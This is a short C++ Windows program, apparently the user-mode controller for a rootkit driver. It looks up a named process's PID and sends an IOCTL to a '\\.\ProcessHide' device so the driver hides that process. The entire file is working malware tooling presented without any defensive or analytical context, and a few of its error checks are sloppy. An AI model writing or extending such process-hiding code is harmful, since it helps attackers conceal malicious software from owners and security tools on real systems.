
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include "ioctl_codes.h"

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    DWORD numBytes;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) 
    {
        printf("[UserCall] : CreateToolhelp32Snapshot (of processes)");
        return(FALSE);
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) 
    {
        printf("[UserCall] : Process32First");
        CloseHandle(hProcessSnap);
        return(FALSE);
    }

    do {
        WCHAR* curr_name = pe32.szExeFile;
        if (wcscmp(curr_name, argv[1]) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    if (!pid != 0) 
    {
        printf("[UserCall] : Process not found\nExiting...");
        exit(1);
    }

    HANDLE hFile = CreateFile(L"\\\\.\\ProcessHide", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hFile < 0) {
        printf("[UserCall] : Hubo un error obteniendo el handle hacia el enlace simbólico");
        exit(1);
    }
   
    if (!DeviceIoControl(hFile, IOCTL_HIDE_PROCESS_BY_PID, &pid, sizeof(DWORD), NULL, 0, &numBytes, NULL)) {
        printf("[UserCall] : Error on device io control");
        exit(1);
    }

    exit(0);
}
